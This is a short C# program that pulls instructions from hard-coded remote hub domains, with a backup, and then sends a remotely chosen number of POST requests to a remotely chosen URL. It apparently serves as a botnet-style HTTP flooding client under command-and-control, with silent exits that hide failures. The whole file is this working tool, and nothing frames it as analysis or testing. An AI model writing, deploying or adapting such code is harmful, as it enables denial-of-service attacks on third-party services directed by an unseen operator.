using System.Text;

namespace stms;

public class MainClass
{
    public const string hub_url = "https://wardex.space/stms/req.json";
    public const string hub_url_backup = "https://mod.wtf/stms/req.json";

    private static readonly HttpClient _httpClient = new HttpClient();

    public static void Main()
    {
        MainAsync().GetAwaiter().GetResult();
    }

    public static async Task MainAsync()
    {
        try
        {
            await Handle(hub_url);
        }
        catch (Exception)
        {
            try
            {
                await Handle(hub_url_backup);
            }
            catch
            {
                Environment.Exit(0);
            }
        }

        Environment.Exit(0);
    }

    public static async Task Handle(string target_url)
    {
        HttpResponseMessage response = await _httpClient.GetAsync(target_url);
        response.EnsureSuccessStatusCode();
        string jsonResponse = await response.Content.ReadAsStringAsync();

        string url = ExtractJsonString(jsonResponse, "url");
        int count = ExtractJsonInt(jsonResponse, "count");

        if (string.IsNullOrEmpty(url))
            throw new Exception("Empty URL");

        for (var i = 0; i < count; i++)
        {
            await SendRequest(url);
        }
    }

    public static async Task SendRequest(string target_url)
    {
        var content = new StringContent("{ \"hello\": \"hello world\" }", Encoding.UTF8, "application/json");
        await _httpClient.PostAsync(target_url, content);
    }

    private static string? ExtractJsonString(string json, string key)
    {
        try
        {
            string searchKey = $"\"{key}\"";
            int keyIndex = json.IndexOf(searchKey, StringComparison.OrdinalIgnoreCase);
            if (keyIndex == -1) return null;

            int colonIndex = json.IndexOf(':', keyIndex + searchKey.Length);
            if (colonIndex == -1) return null;

            int firstQuote = json.IndexOf('"', colonIndex);
            if (firstQuote == -1) return null;

            int secondQuote = json.IndexOf('"', firstQuote + 1);
            if (secondQuote == -1) return null;

            return json.Substring(firstQuote + 1, secondQuote - firstQuote - 1);
        }
        catch
        {
            return null;
        }
    }

    private static int ExtractJsonInt(string json, string key)
    {
        try
        {
            string searchKey = $"\"{key}\"";
            int keyIndex = json.IndexOf(searchKey, StringComparison.OrdinalIgnoreCase);
            if (keyIndex == -1) return 0;

            int colonIndex = json.IndexOf(':', keyIndex + searchKey.Length);
            if (colonIndex == -1) return 0;

            int startIndex = colonIndex + 1;
            while (startIndex < json.Length && char.IsWhiteSpace(json[startIndex]))
            {
                startIndex++;
            }

            int endIndex = startIndex;
            while (endIndex < json.Length && (char.IsDigit(json[endIndex]) || json[endIndex] == '-'))
            {
                endIndex++;
            }

            if (int.TryParse(json.Substring(startIndex, endIndex - startIndex), out int result))
            {
                return result;
            }
        }
        catch
        {
            // ignored
        }
        return 0;
    }
}